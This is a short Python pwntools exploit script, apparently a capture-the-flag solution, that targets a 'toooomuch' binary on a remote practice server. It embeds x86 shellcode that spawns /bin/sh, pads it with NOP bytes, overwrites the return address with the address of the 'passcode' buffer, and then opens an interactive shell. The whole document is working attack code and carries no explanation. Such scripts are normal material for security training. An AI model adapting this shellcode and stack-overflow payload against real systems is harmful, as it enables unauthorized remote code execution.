from pwn import *

#io = process("./toooomuch")
io = remote("hackme.inndy.tw", 7702 )
elf = ELF("./toooomuch")

buf2_addr = elf.symbols["passcode"]
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
print disasm(shellcode)

payload = shellcode.ljust(0x18 + 0x4, "\x90") + p32(buf2_addr)

io.sendlineafter("code: ",payload)

io.interactive()
